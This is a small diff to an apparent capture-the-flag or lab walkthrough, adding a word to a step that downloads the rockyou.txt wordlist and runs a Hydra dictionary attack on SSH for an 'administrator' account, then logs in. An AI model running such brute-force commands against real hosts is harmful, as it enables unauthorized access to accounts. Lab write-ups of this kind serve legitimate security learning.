@@ -86,7 +86,7 @@ Got the info !! 😸
 
 <h3>Now we'll use Hydra to dictionary attack on ssh with the username for passwords using rockyou.txt</h3>
 
-[rockyou.txt](https://raw.githubusercontent.com/zacheller/rockyou/refs/heads/master/rockyou.txt.tar.gz)\
+Download [rockyou.txt](https://raw.githubusercontent.com/zacheller/rockyou/refs/heads/master/rockyou.txt.tar.gz)\
 **Using hydra :** `hydra -l administrator -P /path/rockyou.txt ssh://<target ip> -t 4`\
 (check man page or hydra --help for more combinations)\
 **Hope you got the password now login to ssh** `ssh administrator@<ip>` then enter password 🙂
